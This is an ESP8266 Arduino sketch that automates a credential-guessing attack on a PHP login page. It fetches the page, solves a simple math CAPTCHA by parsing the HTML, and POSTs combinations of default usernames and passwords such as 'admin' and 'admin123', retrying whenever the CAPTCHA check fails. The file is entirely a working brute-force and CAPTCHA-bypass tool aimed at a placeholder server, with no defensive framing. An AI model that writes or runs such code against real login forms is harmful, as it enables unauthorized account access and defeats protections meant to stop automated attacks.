#include <ESP8266WiFi.h>
#include <WiFiClientSecure.h>
#include <ESP8266HTTPClient.h>

// Your WiFi credentials
const char* ssid = "Your_WiFi_SSID";
const char* password = "Your_WiFi_Password";

// Server details
const char* server = "http://yourserver.com/login.php"; // Replace with your PHP login URL

// Sample credentials to try (usernames & passwords)
String usernames[] = {"admin", "user", "test"};
String passwords[] = {"1234", "password", "admin123"};

// Function to extract and solve CAPTCHA
String solveMathCaptcha(String html) {
  int start = html.indexOf("CAPTCHA: ");
  if (start == -1) return "";

  String sub = html.substring(start + 9);
  sub.trim();

  int opPos = -1;
  char op = 0;

  for (int i = 0; i < sub.length(); i++) {
    if (sub.charAt(i) == '+' || sub.charAt(i) == '-' || sub.charAt(i) == '*') {
      opPos = i;
      op = sub.charAt(i);
      break;
    }
  }

  if (opPos == -1) return "";

  int num1 = sub.substring(0, opPos).toInt();
  int num2 = sub.substring(opPos + 1).toInt();
  int result = 0;

  switch (op) {
    case '+': result = num1 + num2; break;
    case '-': result = num1 - num2; break;
    case '*': result = num1 * num2; break;
  }

  return String(result);
}

void tryLogin(String username, String password) {
  HTTPClient http;
  WiFiClient client;

  Serial.println("[*] Fetching login page...");

  http.begin(client, server);
  int code = http.GET();

  if (code != 200) {
    Serial.println("❌ Failed to load login page.");
    http.end();
    return;
  }

  String html = http.getString();
  String captchaAnswer = solveMathCaptcha(html);

  http.end();

  if (captchaAnswer == "") {
    Serial.println("❌ Could not parse CAPTCHA.");
    return;
  }

  Serial.println("[*] CAPTCHA solved: " + captchaAnswer);

  http.begin(client, server);
  http.addHeader("Content-Type", "application/x-www-form-urlencoded");

  String postData = "username=" + username + "&password=" + password + "&captcha=" + captchaAnswer;
  int postCode = http.POST(postData);

  if (postCode > 0) {
    String response = http.getString();
    if (response.indexOf("✅ Login Successful") >= 0) {
      Serial.println("✅ SUCCESS with " + username + ":" + password);
    } else if (response.indexOf("❌ CAPTCHA Failed") >= 0) {
      Serial.println("🔁 CAPTCHA failed, retrying...");

      http.end();
      tryLogin(username, password);  // Recursive retry
      return;
    } else {
      Serial.println("❌ Wrong credentials: " + username + ":" + password);
    }
  } else {
    Serial.println("❌ POST request failed.");
  }

  http.end();
}

void setup() {
  Serial.begin(115200);
  WiFi.begin(ssid, password);

  Serial.println("🔌 Connecting to WiFi...");
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println("\n📶 Connected!");

  for (int i = 0; i < sizeof(usernames) / sizeof(usernames[0]); i++) {
    for (int j = 0; j < sizeof(passwords) / sizeof(passwords[0]); j++) {
      Serial.println("--------------------------------------------------");
      Serial.println("🔐 Trying: " + usernames[i] + " / " + passwords[j]);
      tryLogin(usernames[i], passwords[j]);
      delay(3000); // Delay to avoid spamming server
    }
  }
}

void loop() {
  // Nothing here
}
